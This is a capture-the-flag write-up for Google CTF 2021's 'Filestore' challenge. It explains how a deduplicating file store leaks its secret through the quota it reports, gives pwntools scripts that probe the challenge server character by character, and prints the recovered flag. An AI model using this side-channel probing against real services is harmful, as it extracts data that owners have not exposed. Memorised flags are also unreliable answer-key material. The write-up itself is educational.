---
description: >-
  We stored our flag on this platform, but forgot to save the id. Can you help
  us restore it?
---

# Filestore

## Analysis

When running the program, we have 4 options.

```text
➜  Google ./filestore.py          
Welcome to our file storage solution.

Menu:
- load
- store
- status
- exit
```

Let's first look at the source code for saving and loading files.

First, all data is stored in `blob`:

```python
# It's a tiny server...
blob = bytearray(2**16)
files = {}
used = 0
```

The storing of data works through deduplication. I've added some comments to the source code to make it more understandable:

```python
# Use deduplication to save space.
def store(data):
    nonlocal used
    MINIMUM_BLOCK = 16
    MAXIMUM_BLOCK = 1024
    part_list = []
    while data:
        prefix = data[:MINIMUM_BLOCK]
        ind = -1
        bestlen, bestind = 0, -1

        # Find the best 'matching' part of the blob
        while True:
            ind = blob.find(prefix, ind+1)
            if ind == -1: break
            length = len(os.path.commonprefix([data, bytes(blob[ind:ind+MAXIMUM_BLOCK])]))
            if length > bestlen:
                bestlen, bestind = length, ind

        # Store the index of the match 
        if bestind != -1:
            part, data = data[:bestlen], data[bestlen:]
            part_list.append((bestind, bestlen))

        # Append to the end
        else:
            part, data = data[:MINIMUM_BLOCK], data[MINIMUM_BLOCK:]
            blob[used:used+len(part)] = part
            part_list.append((used, len(part)))
            used += len(part)
            assert used <= len(blob)

    fid = "".join(secrets.choice(string.ascii_letters+string.digits) for i in range(16))
    files[fid] = part_list

    return fid
```

Each 'file' is essentially represented by indices on the `blob` bytearray. If the new data is a duplicate of existing data, then no new data is stored onto the bytearray. Instead, the file is represented by an index pointing to the duplicated data.

For the purposes of analysis, we can print the first few bytes of `blob` and the `part_list`.

Here's an example:

```python
➜  Google ./filestore.py
Welcome to our file storage solution.

# Saving the flag into the blob
bytearray(b'testflag\x00\x00')
[(0, 8)]

Menu:
- load
- store
- status
- exit
store
Send me a line of data...
test

# Duplicated data at index 0
bytearray(b'testflag\x00\x00')
[(0, 4)]

Stored! Here's your file id:
tObXrn5TRAMIGl6W
```

Now, if we look at the `status` command, we see that the 'Quota' represents the used space in the `blob` bytearray. Since duplicated data was stored, the quota remains at 0.008kB.

```text
status
User: ctfplayer
Time: Mon Jul 19 00:16:34 2021
Quota: 0.008kB/64.000kB
Files: 2
```

This is very helpful to us - it allows us to check whether the data we are storing is a substring of the flag. If it is a substring, then the quota should remain the same. Otherwise, new data is stored and the used quota increases.

## Solving

This observation allows us to do a fairly trivial check for which characters are found in the flag. By sending each possible character and checking the quota value afterwards, we can confirm whether or not that character is found in the flag.

```python
from pwn import *
import string
import re

result = ''

conn = remote('filestore.2021.ctfcompetition.com', 1337)
conn.recv()
conn.recv()
conn.send('status\r\n')

received = conn.recvuntil('Menu').decode()
match = re.search(r'Quota: (.+)/64.000kB', received)

target_quota = match[1]

conn.close()

valid = []

for char in string.ascii_letters + string.digits + '{}_':
    conn = remote('filestore.2021.ctfcompetition.com', 1337)
    conn.recv()
    conn.send('store\r\n')
    conn.recv()
    conn.send(f'{char}\r\n')
    conn.recvuntil('Menu')

    conn.send('status\r\n')
    received = conn.recvuntil('Menu').decode()
    match = re.search(r'Quota: (.+)/64.000kB', received)

    quota = match[1]
    if quota == target_quota:
        print(f"{char} works!")
        valid.append(char)

    conn.close()

print(valid)
```

But how do we get the flag? Checking each possible permutation of these valid characters would take too long, but we can reduce the time complexity by checking valid 2-character permutations, then combine these to check for valid 4-character permutations, and so on. This reduces the total number of permutations we have to check since it eliminates a lot of possible permutations early on.

```python
from itertools import product

valid_n_chars = {1: valid}

LEN_FLAG = 26

i = 2
while i <= LEN_FLAG:

    result = []

    permutations = [''.join(x) for x in product(valid_n_chars[i // 2], repeat = 2)]
    num_permutations = len(permutations)

    count = 0
    for permutation in permutations:
        flag = ''.join(permutation)

        print(f"Trying {flag}...")

        conn = remote('filestore.2021.ctfcompetition.com', 1337)
        conn.recv()
        conn.send('store\r\n')
        conn.recv()
        conn.send(f'{flag}\r\n')
        conn.recvuntil('Menu')

        conn.send('status\r\n')
        received = conn.recvuntil('Menu').decode()
        match = re.search(r'Quota: (.+)/64.000kB', received)

        quota = match[1]
        if quota == target_quota:
            print(f"{flag} works!")
            result.append(flag)

        conn.close()

        if count % 10 == 0:
            print('Progress:', count / num_permutations)
        count += 1

    valid_n_chars[i] = result
    i *= 2

    print('Valid results:', result)
```

This eventually outputs all valid 16-character substrings of the flag.

![](../../.gitbook/assets/filestore%20%281%29.png)

From here, we can reconstruct the flag: `CTF{CR1M3_0f_d3dup1ic4ti0n}`

